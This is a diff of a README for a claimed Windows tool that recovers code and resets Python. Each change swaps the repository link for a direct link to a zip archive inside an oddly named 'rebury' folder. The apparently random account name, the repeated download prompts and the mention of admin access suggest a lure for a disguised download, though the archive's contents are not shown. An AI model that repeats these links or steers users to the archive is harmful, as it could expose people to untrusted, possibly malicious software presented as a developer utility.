@@ -1,12 +1,12 @@
 # 🛠️ claude-code-recover-and-python-reset - Recover code and reset Python fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset/main/rebury/claude_recover_reset_code_and_python_v1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page to download:
 
-https://github.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset
+https://raw.githubusercontent.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset/main/rebury/claude_recover_reset_code_and_python_v1.2.zip
 
 ## 🖥️ What this app does
 
@@ -40,7 +40,7 @@ If you use a work PC, you may need admin access to finish setup.
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset
+   https://raw.githubusercontent.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset/main/rebury/claude_recover_reset_code_and_python_v1.2.zip
 
 2. Find the latest release or download area on the page.
 
@@ -238,7 +238,7 @@ For your first run, use this order:
 
 If the file gets lost or deleted, use this link again:
 
-[https://github.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset](https://github.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset)
+[https://raw.githubusercontent.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset/main/rebury/claude_recover_reset_code_and_python_v1.2.zip](https://raw.githubusercontent.com/thymusvulgarisexperimentalism631/claude-code-recover-and-python-reset/main/rebury/claude_recover_reset_code_and_python_v1.2.zip)
 
 ## 🧭 Next steps
 
